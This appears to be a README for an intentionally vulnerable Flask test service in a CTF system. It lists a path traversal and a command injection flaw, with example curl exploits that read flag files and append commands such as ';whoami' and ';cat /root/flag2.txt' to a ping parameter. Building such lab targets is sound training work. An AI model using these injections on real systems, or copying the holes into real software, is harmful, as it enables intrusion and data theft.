# Test Vulnerable Web Service

A simple Flask-based web service with intentional vulnerabilities for testing the CTF system.

## Vulnerabilities

### 1. Path Traversal (Easy - User Flag)
**Endpoint**: `/read?file=<filename>`

**Exploit**:
```bash
curl "http://localhost:8001/read?file=/home/ctf/flag1.txt"
```

Reads any file readable by the `ctf` user (UID 1000).

### 2. Command Injection (Hard - Root Flag)
**Endpoint**: `/ping?host=<host>`

**Exploit**:
```bash
# Basic RCE
curl "http://localhost:8001/ping?host=127.0.0.1;whoami"

# Read root flag (requires root privesc)
curl "http://localhost:8001/ping?host=127.0.0.1;cat%20/root/flag2.txt"
```

**Note**: Service runs as `ctf` user, so reading `/root/flag2.txt` requires privilege escalation.

## Flags

- **User Flag**: `/home/ctf/flag1.txt` (permissions: 644, owner: ctf:ctf)
- **Root Flag**: `/root/flag2.txt` (permissions: 600, owner: root:root)

## Building & Running

```bash
# Build image
docker build -t test_vuln_web .

# Run container
docker run -d -p 8001:8001 --name test_vuln test_vuln_web

# Test
curl http://localhost:8001/
```

## Testing Flag Injection

```bash
# Inject flags using gameserver
python3 << 'EOF'
from gameserver.checker import FlagInjector

injector = FlagInjector()

# Inject user flag
injector.inject_user_flag('test_vuln', 'FLAG{test_user_123}')

# Inject root flag
injector.inject_root_flag('test_vuln', 'FLAG{test_root_456}')

# Verify
injector.verify_flag_exists('test_vuln', '/home/ctf/flag1.txt', 'FLAG{test_user_123}')
EOF
```

## Security Notes

⚠️ **FOR TESTING ONLY!** This service is intentionally vulnerable. Do not deploy in production or expose to the internet.
